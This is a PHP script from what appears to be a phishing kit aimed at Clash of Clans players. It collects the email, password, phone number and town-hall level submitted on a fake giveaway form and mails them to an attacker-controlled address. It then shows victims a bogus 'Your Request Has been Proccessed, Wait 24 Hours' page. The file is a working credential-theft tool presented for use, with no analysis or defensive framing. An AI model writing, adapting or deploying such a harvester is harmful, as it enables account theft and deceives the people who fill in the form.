<?php
############################################
##        Author: Hiryuu                  ##
##        Mailer: Hiryuu                  ##
##       Modifer: Netifex.net             ##
############################################
/* JANGAN GANTI COPYRIGHT NYA YA SAYANG */

$subjek = 'PAKET COC DATANG By Hiryuu';
$mailto = 'hiryuu@mail.com'; //masukin email lo disini



$imel = $_POST['email'];
$paswot = $_POST['password'];
$henpon = $_POST['hp'];
$teha = $_POST ['th'];



$body = <<<EOD
<br><hr><br>

Email : <font color="green">$imel</font> <br>
Password : <font color="red">$paswot</font> <br>
Handphone : <font color="purple">$henpon</font> <br>
TH : <font color="blue">$teha</font> <br>
EOD;


$headers = "From: Hiryuu@tamvan.com\r\n"; // Buat nunjukin pengirim email.
$headers .= "Content-type: text/html\r\n"; // Untuk memerintahkan server melakukan coding teks.
$success = mail($mailto, $subjek, $body, $headers); 
?>
<?php
$random = rand(1000,5000);
?>
<html>
<head>
<style>
body {
	background-image: url("pesing_files/bg_1.jpg")
}
</style>
<title> Thank You ! </title>
</head>
<body>
<center> <h2> Your Request Has been Proccessed,Wait 24 Hours </h2><br>
</body>
</html>